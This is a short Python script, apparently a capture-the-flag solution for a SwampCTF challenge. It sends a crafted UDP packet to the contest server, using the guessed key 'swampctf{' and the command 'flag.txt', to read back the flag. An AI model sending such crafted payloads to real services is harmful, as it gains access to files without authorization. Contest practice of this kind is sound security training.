#!/usr/bin/env python3

import socket

server = "chals.swampctf.com"
port = 44255

# 02 request command
# 15 key length
# xxx super secret key
# 08 command length
# flag.txt command
payload = (
    b"\x02"
    + len(b"swampctf{").to_bytes(1, "big")
    + b"swampctf{"
    + len(b"flag.txt").to_bytes(1, "big")
    + b"flag.txt"
)

# UDP protocol
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

_ = s.sendto(payload, (server, port))

response, addr = s.recvfrom(4096)

print(f"response: {response.decode(errors='ignore')}")

s.close()
